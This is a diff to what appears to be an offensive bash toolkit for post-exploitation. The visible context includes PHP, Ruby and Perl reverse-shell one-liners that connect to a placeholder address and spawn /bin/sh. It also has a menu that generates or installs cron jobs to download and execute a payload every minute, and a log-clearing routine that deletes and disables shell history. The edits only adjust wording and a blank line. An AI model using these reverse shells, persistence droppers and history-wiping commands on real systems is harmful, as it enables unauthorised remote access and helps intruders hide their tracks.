@@ -22,6 +22,7 @@ function genpayload() {
 		"php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
 		"ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
 		"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+		
 		)
 
 		function encshell() {
@@ -103,14 +104,14 @@ function cron() {
 
 		}
 		PS3="Generate cron job payload dropper command or add cron job to this machine: "
-		options=("Generate crontab command to download and payload every minute" "Add cron job to this system to download and execute every minute" "Return to main menu")
+		options=("Generate crontab command to download and execute payload every minute" "Add cron job to this system to download and execute payload every minute" "Return to main menu")
 		select opt in "${options[@]}"
 		do
 			case $opt in
-				"Generate crontab command to download and payload every minute")
+				"Generate crontab command to download and execute payload every minute")
 					command
 					;;
-				"Add cron job to this system to download and execute every minute")
+				"Add cron job to this system to download and execute payload every minute")
 					add2sys
 					;;
 				"Return to main menu")
@@ -129,7 +130,7 @@ function clearlog() {
 		export HISTFILE=
 		unset HISTFILE
 		rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null
-		> ~/.bash_history
+		touch ~/.bash_history
 		zsh% unset HISTFILE HISTSIZE
 		tcsh% set history=0
 		bash$ set +o history
